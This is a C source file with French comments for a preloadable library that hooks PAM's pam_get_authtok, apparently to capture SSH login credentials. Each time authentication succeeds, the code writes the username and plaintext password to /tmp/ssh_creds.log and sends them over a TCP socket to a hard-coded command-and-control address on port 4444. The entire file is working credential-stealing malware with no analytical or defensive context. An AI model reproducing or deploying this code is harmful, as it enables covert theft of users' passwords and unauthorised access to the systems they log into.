#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>

#define BUFFER_SIZE 1024
#define C2_IP "192.168.109.130"  //ip serveur
#define C2_PORT 4444

typedef int (*pam_get_authtok_t)(pam_handle_t *, int, const char **, const char *);
pam_get_authtok_t orig_pam_get_authtok = NULL;

// Fonction pour envoyer les credentials au serveur C2
void send_to_c2(const char *data) {
    int sock;
    struct sockaddr_in server_addr;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("[-] Erreur socket");
        return;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(C2_PORT);
    if (inet_pton(AF_INET, C2_IP, &server_addr.sin_addr) <= 0) {
        perror("[-] Erreur inet_pton");
        close(sock);
        return;
    }

    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("[-] Erreur connect");
        close(sock);
        return;
    }

    send(sock, data, strlen(data), 0);
    close(sock);
}

// Hook de pam_get_authtok
int pam_get_authtok(pam_handle_t *pamh, int item, const char **authtok, const char *prompt) {
    if (!orig_pam_get_authtok) {
        orig_pam_get_authtok = dlsym(RTLD_NEXT, "pam_get_authtok");
        if (!orig_pam_get_authtok) {
            fprintf(stderr, "[-] Erreur dlsym : impossible de récupérer pam_get_authtok\n");
            return PAM_AUTH_ERR;
        }
    }

    int ret = orig_pam_get_authtok(pamh, item, authtok, prompt);

    if (ret == PAM_SUCCESS && authtok && *authtok) {
        const char *username = NULL;
        pam_get_item(pamh, PAM_USER, (const void **)&username);

        char log_entry[BUFFER_SIZE];
        snprintf(log_entry, BUFFER_SIZE, "[+] Username : %s | Mot de passe : %s", username ? username : "UNKNOWN", *authtok);

        // Enregistrement en local
        FILE *f = fopen("/tmp/ssh_creds.log", "a");
        if (f) {
            fprintf(f, "%s\n", log_entry);
            fclose(f);
        }

        // Envoi au serveur C2
        send_to_c2(log_entry);
    }

    return ret;
}